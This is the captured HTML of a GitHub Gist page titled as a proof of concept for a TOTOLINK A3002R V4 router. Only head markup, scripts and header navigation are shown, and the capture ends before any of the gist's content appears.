





<!DOCTYPE html>
<html
  lang="en"
  
  data-color-mode="auto" data-light-theme="light" data-dark-theme="dark"
  data-a11y-animated-images="system" data-a11y-link-underlines="true"
  
  >



  <head>
    <meta charset="utf-8">
  <link rel="dns-prefetch" href="https://github.githubassets.com">
  <link rel="dns-prefetch" href="https://avatars.githubusercontent.com">
  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">
  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">
  <link rel="preconnect" href="https://github.githubassets.com" crossorigin>
  <link rel="preconnect" href="https://avatars.githubusercontent.com">

  

  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/light-0cfd1fd8509e.css" /><link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/dark-d782f59290e2.css" /><link data-color-theme="dark_dimmed" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_dimmed-f9fbc4b99a77.css" /><link data-color-theme="dark_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_high_contrast-cff1c9b27b1a.css" /><link data-color-theme="dark_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_colorblind-70097f75aec1.css" /><link data-color-theme="light_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_colorblind-c2f0d49bdcd9.css" /><link data-color-theme="light_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_high_contrast-4747d7bc0bc4.css" /><link data-color-theme="light_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_tritanopia-d3f6a61c91c8.css" /><link data-color-theme="dark_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_tritanopia-a188d53f44bb.css" />

    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-primitives-953961b66e63.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-4430d3c2c150.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/global-7e1d0e4dee6a.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/github-e72829f5538b.css" />
  

  


  <script type="application/json" id="client-env">{"locale":"en","featureFlags":["alive_longer_retries","bypass_copilot_indexing_quota","copilot_new_references_ui","copilot_beta_features_opt_in","copilot_chat_retry_on_error","copilot_chat_persist_submitted_input","copilot_conversational_ux_history_refs","copilot_editor_upsells","copilot_free_limited_user","copilot_implicit_context","copilot_no_floating_button","copilot_smell_icebreaker_ux","experimentation_azure_variant_endpoint","failbot_handle_non_errors","geojson_azure_maps","ghost_pilot_confidence_truncation_25","ghost_pilot_confidence_truncation_40","hovercard_accessibility","issues_react_remove_placeholders","issues_react_blur_item_picker_on_close","marketing_pages_search_explore_provider","react_keyboard_shortcuts_dialog","remove_child_patch","sample_network_conn_type","site_metered_billing_update","site_copilot_free","lifecycle_label_name_updates"]}</script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/wp-runtime-3619c2af2a73.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_oddbird_popover-polyfill_dist_popover_js-9da652f58479.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_arianotify-polyfill_ariaNotify-polyfill_js-node_modules_github_mi-3abb8f-d7e6bc799724.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_failbot_failbot_ts-71291b73d826.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/environment-7b93e0f0c8ff.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_primer_behaviors_dist_esm_index_mjs-ea2a5d75d580.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_selector-observer_dist_index_esm_js-f690fd9ae3d5.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_relative-time-element_dist_index_js-f6da4b3fa34c.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_auto-complete-element_dist_index_js-node_modules_github_catalyst_-8e9f78-a74b4e0a8a6b.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_text-expander-element_dist_index_js-78748950cb0c.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_filter-input-element_dist_index_js-node_modules_github_remote-inp-b5f1d7-a1760ffda83d.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_markdown-toolbar-element_dist_index_js-ceef33f593fa.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_file-attachment-element_dist_index_js-node_modules_primer_view-co-c44a69-c6d035fa8dc8.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/github-elements-f991cfab5105.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/element-registry-3b5362d3d402.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_braintree_browser-detection_dist_browser-detection_js-node_modules_githu-bb80ec-7f43298e364b.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_lit-html_lit-html_js-be8cb88f481b.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_morphdom_dist_morphdom-e-7c534c-a4a1922eb55f.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_turbo_dist_turbo_es2017-esm_js-e3cbe28f1638.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_remote-form_dist_index_js-node_modules_delegated-events_dist_inde-893f9f-6cf3320416b8.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_color-convert_index_js-e3180fe3bcb3.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_quote-selection_dist_index_js-node_modules_github_session-resume_-69cfcc-833249ee3034.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_updatable-content_updatable-content_ts-863ef5872a03.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_task-list_ts-app_assets_modules_github_sso_ts-ui_packages-900dde-917d4bda1f1a.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_sticky-scroll-into-view_ts-7cbef09a422c.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_ajax-error_ts-app_assets_modules_github_behaviors_include-d0d0a6-b41aeef03499.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_commenting_edit_ts-app_assets_modules_github_behaviors_ht-83c235-fb43816ab83c.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/behaviors-999d1d44cef0.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_delegated-events_dist_index_js-node_modules_github_catalyst_lib_index_js-f6223d90c7ba.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/notifications-global-cfcd9f4f0f23.js"></script>
  
  <script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_delegated-events_dist_index_js-node_modules_github_hotkey_dist_index_js-524e40420665.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_github_remote-form_dist_-d0eef7-5f58a29a0546.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_form-utils_form-utils_ts-ui_packages_input-navigation-behavior_input-navigation-b-a97423-0ee33bdc7197.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_diffs_blob-lines_ts-app_assets_modules_github_diffs_linkable-line-n-b8c0ea-be4e711b7e28.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/gist-7ae34499530e.js"></script>


  <title>TOTOLINK-A3002R-V4-Poc.md · GitHub</title>



  <meta name="route-pattern" content="/:user_id/:gist_id(.:format)" data-turbo-transient>
  <meta name="route-controller" content="gists_gists" data-turbo-transient>
  <meta name="route-action" content="show" data-turbo-transient>

    
  <meta name="current-catalog-service-hash" content="56253a530ab9027b25719525dcbe6007461a3202218f6f5dfce5a601c121cbcb">


  <meta name="request-id" content="9F64:3D9F37:870E60:A3D130:67813531" data-pjax-transient="true"/><meta name="html-safe-nonce" content="18bb4f4b7997f0b7dd0f4843612310ea8d508a464d6df62ab31644193f02f1b3" data-pjax-transient="true"/><meta name="visitor-payload" content="eyJyZWZlcnJlciI6IiIsInJlcXVlc3RfaWQiOiI5RjY0OjNEOUYzNzo4NzBFNjA6QTNEMTMwOjY3ODEzNTMxIiwidmlzaXRvcl9pZCI6IjIwODU5MjIzMzI5OTk3NDM3NzQiLCJyZWdpb25fZWRnZSI6Im5lLTAxIiwicmVnaW9uX3JlbmRlciI6Im5vcnRoZXVyb3BlIn0=" data-pjax-transient="true"/><meta name="visitor-hmac" content="9008b1aa684d182091f85d02b694dd60aedebdc2a1bd091c56334bec8ee41810" data-pjax-transient="true"/>




  <meta name="github-keyboard-shortcuts" content="copilot" data-turbo-transient="true" />
  

  <meta name="selected-link" value="gist_code" data-turbo-transient>
  <link rel="assets" href="https://github.githubassets.com/">

    <meta name="google-site-verification" content="Apib7-x98H0j5cPqHWwSMm6dNU4GmODRoqxLiDzdx9I">

<meta name="octolytics-url" content="https://collector.github.com/github/collect" />

  <meta name="analytics-location" content="/&lt;user-name&gt;/&lt;gist-id&gt;" data-turbo-transient="true" />

  




    <meta name="user-login" content="">

  

    <meta name="viewport" content="width=device-width">

    

      <meta name="description" content="GitHub Gist: instantly share code, notes, and snippets.">

      <link rel="search" type="application/opensearchdescription+xml" href="/opensearch-gist.xml" title="Gist">

    <link rel="fluid-icon" href="https://gist.github.com/fluidicon.png" title="GitHub">
    <meta property="fb:app_id" content="1401488693436528">
    <meta name="apple-itunes-app" content="app-id=1477376905, app-argument=https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17" />

      <meta name="twitter:image" content="https://github.githubassets.com/assets/gist-og-image-54fd7dc0713e.png" /><meta name="twitter:site" content="@github" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="TOTOLINK-A3002R-V4-Poc.md" /><meta name="twitter:description" content="GitHub Gist: instantly share code, notes, and snippets." />
  <meta property="og:image" content="https://github.githubassets.com/assets/gist-og-image-54fd7dc0713e.png" /><meta property="og:image:alt" content="GitHub Gist: instantly share code, notes, and snippets." /><meta property="og:site_name" content="Gist" /><meta property="og:type" content="article" /><meta property="og:title" content="TOTOLINK-A3002R-V4-Poc.md" /><meta property="og:url" content="https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17" /><meta property="og:description" content="GitHub Gist: instantly share code, notes, and snippets." /><meta property="article:author" content="262588213843476" /><meta property="article:publisher" content="262588213843476" />
  




      <meta name="hostname" content="gist.github.com">



        <meta name="expected-hostname" content="gist.github.com">


  <meta http-equiv="x-pjax-version" content="4339a7251835647c588cab43cc351e6ae795a405e0832edaecd13a537b38b9db" data-turbo-track="reload">
  <meta http-equiv="x-pjax-csp-version" content="ace39c3b6632770952207593607e6e0be0db363435a8b877b1f96abe6430f345" data-turbo-track="reload">
  <meta http-equiv="x-pjax-css-version" content="83077cf911605d17127453d01c62034b8070f991798fc7ededcb0f1f056f9796" data-turbo-track="reload">
  <meta http-equiv="x-pjax-js-version" content="d194eb0ab91a29f910bc29a31ecf3598baabed39ca8fdadbdad95892a3a00407" data-turbo-track="reload">

  <meta name="turbo-cache-control" content="no-preview" data-turbo-transient="">

      <link href="/Swind1er.atom" rel="alternate" title="atom" type="application/atom+xml">


  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/gist-4afe775cc576.css" />




    <meta name="turbo-body-classes" content="logged-out env-production page-responsive">


  <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">

  <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">

  <link rel="mask-icon" href="https://github.githubassets.com/assets/pinned-octocat-093da3e6fa40.svg" color="#000000">
  <link rel="alternate icon" class="js-site-favicon" type="image/png" href="https://github.githubassets.com/favicons/favicon.png">
  <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg" data-base-href="https://github.githubassets.com/favicons/favicon">

<meta name="theme-color" content="#1e2327">
<meta name="color-scheme" content="light dark" />



  </head>

  <body class="logged-out env-production page-responsive" style="word-wrap: break-word;">
    <div data-turbo-body class="logged-out env-production page-responsive" style="word-wrap: break-word;">
      


    <div class="position-relative header-wrapper js-header-wrapper ">
      <a href="#start-of-content" data-skip-target-assigned="false" class="px-2 py-4 color-bg-accent-emphasis color-fg-on-emphasis show-on-focus js-skip-to-content">Skip to content</a>

      <span data-view-component="true" class="progress-pjax-loader Progress position-fixed width-full">
    <span style="width: 0%;" data-view-component="true" class="Progress-item progress-pjax-loader-bar left-0 top-0 color-bg-accent-emphasis"></span>
</span>      
      
      <script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/primer-react-eb226383faf4.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/react-core-85b0640cddc8.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/react-lib-2131e17288a8.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/octicons-react-611691cca2f6.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_tanstack_query-core_build_modern_queryClient_js-e6f07a7e80b7.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_emotion_is-prop-valid_dist_emotion-is-prop-valid_esm_js-node_modules_emo-37e3d5-92730c05e718.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_stacktrace-parser_dist_s-e7dcdd-f7cc96ebae76.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_oddbird_popover-polyfill_dist_popover-fn_js-55fea94174bf.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_ui-commands_ui-commands_ts-fecaee5fb732.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/keyboard-shortcuts-dialog-958cae8ecd6c.js"></script>
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react.491a1e189efd351d2e8c.module.css" />

<react-partial
  partial-name="keyboard-shortcuts-dialog"
  data-ssr="false"
  data-attempted-ssr="false"
>
  
  <script type="application/json" data-target="react-partial.embeddedData">{"props":{"docsUrl":"https://docs.github.com/get-started/accessibility/keyboard-shortcuts"}}</script>
  <div data-target="react-partial.reactRoot"></div>
</react-partial>




      

            <div class="Header js-details-container Details flex-wrap flex-md-nowrap p-responsive" role="banner" >
  <div class="Header-item d-none d-md-flex">
    <a class="Header-link" data-hotkey="g d" aria-label="Gist Homepage " href="/">
  <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-mark-github v-align-middle d-inline-block d-md-none">
    <path d="M12.5.75C6.146.75 1 5.896 1 12.25c0 5.089 3.292 9.387 7.863 10.91.575.101.79-.244.79-.546 0-.273-.014-1.178-.014-2.142-2.889.532-3.636-.704-3.866-1.35-.13-.331-.69-1.352-1.18-1.625-.402-.216-.977-.748-.014-.762.906-.014 1.553.834 1.769 1.179 1.035 1.74 2.688 1.25 3.349.948.1-.747.402-1.25.733-1.538-2.559-.287-5.232-1.279-5.232-5.678 0-1.25.445-2.285 1.178-3.09-.115-.288-.517-1.467.115-3.048 0 0 .963-.302 3.163 1.179.92-.259 1.897-.388 2.875-.388.977 0 1.955.13 2.875.388 2.2-1.495 3.162-1.179 3.162-1.179.633 1.581.23 2.76.115 3.048.733.805 1.179 1.825 1.179 3.09 0 4.413-2.688 5.39-5.247 5.678.417.36.776 1.05.776 2.128 0 1.538-.014 2.774-.014 3.162 0 .302.216.662.79.547C20.709 21.637 24 17.324 24 12.25 24 5.896 18.854.75 12.5.75Z"></path>
</svg>
  <svg aria-hidden="true" height="24" viewBox="0 0 68 24" version="1.1" width="68" data-view-component="true" class="octicon octicon-logo-github v-align-middle d-none d-md-inline-block">
    <path d="M27.8 17.908h-.03c.013 0 .022.014.035.017l.01-.002-.016-.015Zm.005.017c-.14.001-.49.073-.861.073-1.17 0-1.575-.536-1.575-1.234v-4.652h2.385c.135 0 .24-.12.24-.283V9.302c0-.133-.12-.252-.24-.252H25.37V5.913c0-.119-.075-.193-.21-.193h-3.24c-.136 0-.21.074-.21.193V9.14s-1.636.401-1.741.416a.255.255 0 0 0-.195.253v2.021c0 .164.12.282.255.282h1.665v4.876c0 3.627 2.55 3.998 4.29 3.998.796 0 1.756-.252 1.906-.327.09-.03.135-.134.135-.238v-2.23a.264.264 0 0 0-.219-.265Zm35.549-3.272c0-2.69-1.095-3.047-2.25-2.928-.9.06-1.62.505-1.62.505v5.232s.735.506 1.83.536c1.545.044 2.04-.506 2.04-3.345ZM67 14.415c0 5.099-1.665 6.555-4.576 6.555-2.46 0-3.78-1.233-3.78-1.233s-.06.683-.135.773c-.045.089-.12.118-.21.118h-2.22c-.15 0-.286-.119-.286-.252l.03-16.514a.26.26 0 0 1 .255-.252h3.196a.26.26 0 0 1 .255.252v5.604s1.23-.788 3.03-.788l-.015-.03c1.8 0 4.456.67 4.456 5.767ZM53.918 9.05h-3.15c-.165 0-.255.119-.255.282v8.086s-.826.58-1.95.58c-1.126 0-1.456-.506-1.456-1.62v-7.06a.262.262 0 0 0-.255-.254h-3.21a.262.262 0 0 0-.256.253v7.596c0 3.27 1.846 4.087 4.381 4.087 2.085 0 3.78-1.145 3.78-1.145s.076.58.12.67c.03.074.136.133.24.133h2.011a.243.243 0 0 0 .255-.253l.03-11.103c0-.133-.12-.252-.285-.252Zm-35.556-.015h-3.195c-.135 0-.255.134-.255.297v10.91c0 .297.195.401.45.401h2.88c.3 0 .375-.134.375-.401V9.287a.262.262 0 0 0-.255-.252ZM16.787 4.01c-1.155 0-2.07.907-2.07 2.051 0 1.145.915 2.051 2.07 2.051a2.04 2.04 0 0 0 2.04-2.05 2.04 2.04 0 0 0-2.04-2.052Zm24.74-.372H38.36a.262.262 0 0 0-.255.253v6.08H33.14v-6.08a.262.262 0 0 0-.255-.253h-3.196a.262.262 0 0 0-.255.253v16.514c0 .133.135.252.255.252h3.196a.262.262 0 0 0 .255-.253v-7.06h4.966l-.03 7.06c0 .134.12.253.255.253h3.195a.262.262 0 0 0 .255-.253V3.892a.262.262 0 0 0-.255-.253Zm-28.31 7.313v8.532c0 .06-.015.163-.09.193 0 0-1.875 1.323-4.966 1.323C4.426 21 0 19.84 0 12.2S3.87 2.986 7.651 3c3.27 0 4.59.728 4.8.862.06.075.09.134.09.208l-.63 2.646c0 .134-.134.297-.3.253-.54-.164-1.35-.49-3.255-.49-2.205 0-4.575.623-4.575 5.543s2.25 5.5 3.87 5.5c1.38 0 1.875-.164 1.875-.164V13.94H7.321c-.165 0-.285-.12-.285-.253v-2.735c0-.134.12-.252.285-.252h5.61c.166 0 .286.118.286.252Z"></path>
</svg>
  <svg aria-hidden="true" height="24" viewBox="0 0 38 24" version="1.1" width="38" data-view-component="true" class="octicon octicon-logo-gist v-align-middle d-none d-md-inline-block">
    <path d="M7.05 13.095v-1.5h5.28v8.535c-1.17.555-2.925.96-5.385.96C1.665 21.09 0 17.055 0 12.045S1.695 3 6.945 3c2.43 0 3.96.495 4.92.99v1.575c-1.83-.75-3-1.095-4.92-1.095-3.855 0-5.22 3.315-5.22 7.59s1.365 7.575 5.205 7.575c1.335 0 2.97-.105 3.795-.51v-6.03H7.05Zm16.47 1.035h.045c3.33.3 4.125 1.425 4.125 3.345 0 1.815-1.14 3.615-4.71 3.615-1.125 0-2.745-.285-3.495-.585v-1.41c.705.255 1.83.54 3.495.54 2.43 0 3.09-1.035 3.09-2.13 0-1.065-.33-1.815-2.655-2.01-3.39-.3-4.095-1.5-4.095-3.12 0-1.665 1.08-3.465 4.38-3.465 1.095 0 2.34.135 3.375.585v1.41c-.915-.3-1.83-.54-3.405-.54-2.325 0-2.82.855-2.82 2.01 0 1.035.42 1.56 2.67 1.755Zm12.87-4.995v1.275h-3.63v7.305c0 1.425.795 2.01 2.25 2.01.3 0 .63 0 .915-.045v1.335c-.255.045-.75.075-1.035.075-1.965 0-3.75-.9-3.75-3.195v-7.5H28.8v-.72l2.34-.66V5.85l1.62-.465v3.75h3.63ZM16.635 9.09v9.615c0 .81.285 1.05 1.005 1.05v1.335c-1.71 0-2.58-.705-2.58-2.58V9.09h1.575Zm.375-3.495c0 .66-.51 1.17-1.17 1.17a1.14 1.14 0 0 1-1.155-1.17c0-.66.48-1.17 1.155-1.17s1.17.51 1.17 1.17Z"></path>
</svg>
</a>
  </div>

  <div class="Header-item d-md-none">
      <button aria-label="Toggle navigation" aria-expanded="false" type="button" data-view-component="true" class="Header-link js-details-target btn-link">    <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-three-bars">
    <path d="M3.75 5.25a.75.75 0 0 0 0 1.5h16.5a.75.75 0 0 0 0-1.5H3.75Zm0 6a.75.75 0 0 0 0 1.5h16.5a.75.75 0 0 0 0-1.5H3.75Zm0 6a.75.75 0 0 0 0 1.5h16.5a.75.75 0 0 0 0-1.5H3.75Z"></path>
</svg>
</button>  </div>

  <div class="Header-item Header-item--full js-site-search flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex">
      <div class="header-search flex-self-stretch flex-md-self-auto mr-0 mr-md-3 mb-3 mb-md-0">
    <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="position-relative js-quicksearch-form" role="search" aria-label="Site" data-turbo="false" action="/search" accept-charset="UTF-8" method="get">
      <div class="header-search-wrapper form-control input-sm js-chromeless-input-container">
        <input type="text"
          class="form-control input-sm js-site-search-focus header-search-input"
          data-hotkey="s,/"
          name="q"
          aria-label="Search"
          placeholder="Search…"
          autocorrect="off"
          autocomplete="off"
          autocapitalize="off">
      </div>

</form></div>


    <nav aria-label="Global" class="d-flex flex-column flex-md-row flex-self-stretch flex-md-self-auto">
  <a class="Header-link mr-0 mr-md-3 py-2 py-md-0 border-top border-md-top-0 border-white-fade" data-ga-click="Header, go to all gists, text:all gists" href="/discover">All gists</a>

  <a class="Header-link mr-0 mr-md-3 py-2 py-md-0 border-top border-md-top-0 border-white-fade" data-ga-click="Header, go to GitHub, text:Back to GitHub" href="https://github.com">Back to GitHub</a>

    <a class="Header-link d-block d-md-none mr-0 mr-md-3 py-2 py-md-0 border-top border-md-top-0 border-white-fade" data-ga-click="Header, sign in" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;gist header&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="933f93b7bbe8bcb1dd3fc712246fa37af8eaa5a0a6d0075de79b2a2c5cd2a8c4" href="https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FSwind1er%2Fee095fbfe13f77a5b45b39a5aa82bd17">
      Sign in
</a>
      <a class="Header-link d-block d-md-none mr-0 mr-md-3 py-2 py-md-0 border-top border-md-top-0 border-white-fade" data-ga-click="Header, sign up" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;gist header&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/Swind1er/ee095fbfe13f77a5b45b39a5aa82bd17&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="8f7c2ffb57b6b0eb47395c31a3657f80d87208dbaedb239437c3397c06af4781" href="/join?return_to=https%3A%2F%2Fgist.github.com%2FSwind1er%2Fee095fbfe13f77a5b45b39a5aa82bd17&amp;source=header-gist">
        Sign up
</a></nav>

  </div>

  <div class="Header-item Header-item--full flex-justify-center d-md-none position-relative">
    <a class="Header-link" data-hotkey="g d" aria-label="Gist Homepage " href="/">
  <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-mark-github v-align-middle d-inline-block d-md-none">
    <path d="M12.5.75C6.146.75 1 5.896 1 12.25c0 5.089 3.292 9.387 7.863 10.91.575.101.79-.244.79-.546 0-.273-.014-1.178-.014-2.142-2.889.532-3.636-.704-3.866-1.35-.13-.331-.69-1.352-1.18-1.625-.402-.216-.977-.748-.014-.762.906-.014 1.553.834 1.769 1.179 1.035 1.74 2.688 1.25 3.349.948.1-.747.402-1.25.733-1.538-2.559-.287-5.232-1.279-5.232-5.678 0-1.25.445-2.285 1.178-3.09-.115-.288-.517-1.467.115-3.048 0 0 .963-.302 3.163 1.179.92-.259 1.897-.388 2.875-.388.977 0 1.955.13 2.875.388 2.2-1.495 3.162-1.179 3.162-1.179.633 1.581.23 2.76.115 3.048.733.805 1.179 1.825 1.179 3.09 0 4.413-2.688 5.39-5.247 5.678.417.36.776 1.05.776 2.128 0 1.538-.014 2.774-.014 3.162 0 .302.216.662.79.547C20.709 21.637 24 17.324 24 12.25 24 5.896 18.854.75 12.5.75Z"></path>
</svg>
  <svg aria-hidden="true" height="24" viewBox="0 0 68 24" version="1.1" width="68" data-view-component="true" class="octicon octicon-logo-github v-align-middle d-none d-md-inline-block">
    <path d="M27.8 17.908h-.03c.013 0 .022.014.035.017l.01-.002-.016-.015Zm.005.017c-.14.001-.49.073-.861.073-1.17 0-1.575-.536-1.575-1.234v-4.652h2.385c.135 0 .24-.12.24-.283V9.302c0-.133-.12-.252-.24-.252H25.37V5.913c0-.119-.075-.193-.21-.193h-3.24c-.136 0-.21.074-.21.193V9.14s-1.636.401-1.741.416a.255.255 0 0 0-.195.253v2.021c0 .164.12.282.255.282h1.665v4.876c0 3.627 2.55 3.998 4.29 3.998.796 0 1.756-.252 1.906-.327.09-.03.135-.134.135-.238v-2.23a.264.264 0 0 0-.219-.265Zm35.549-3.272c0-2.69-1.095-3.047-2.25-2.928-.9.06-1.62.505-1.62.505v5.232s.735.506 1.83.536c1.545.044 2.04-.506 2.04-3.345ZM67 14.415c0 5.099-1.665 6.555-4.576 6.555-2.46 0-3.78-1.233-3.78-1.233s-.06.683-.135.773c-.045.089-.12.118-.21.118h-2.22c-.15 0-.286-.119-.286-.252l.03-16.514a.26.26 0 0 1 .255-.252h3.196a.26.26 0 0 1 .255.252v5.604s1.23-.788 3.03-.788l-.015-.03c1.8 0 4.456.67 4.456 5.767ZM53.918 9.05h-3.15c-.165 0-.255.119-.255.282v8.086s-.826.58-1.95.58c-1.126 0-1.456-.506-1.456-1.62v-7.06a.262.262 0 0 0-.255-.254h-3.21a.262.262 0 0 0-.256.253v7.596c0 3.27 1.846 4.087 4.381 4.087 2.085 0 3.78-1.145 3.78-1.145s.076.58.12.67c.03.074.136.133.24.133h2.011a.243.243 0 0 0 .255-.253l.03-11.103c0-.133-.12-.252-.285-.252Zm-35.556-.015h-3.195c-.135 0-.255.134-.255.297v10.91c0 .297.195.401.45.401h2.88c.3 0 .375-.134.375-.401V9.287a.262.262 0 0 0-.255-.252ZM16.787 4.01c-1.155 0-2.07.907-2.07 2.051 0 1.145.915 2.051 2.07 2.051a2.04 2.04 0 0 0 2.04-2.05 2.04 2.04 0 0 0-2.04-2.052Zm24.74-.372H38.36a.262.262 0 0 0-.255.253v6.08H33.14v-6.08a.262.262 0 0 0-.255-.253h-3.196a.262.262 0 0 0-.255.253v16.514c0 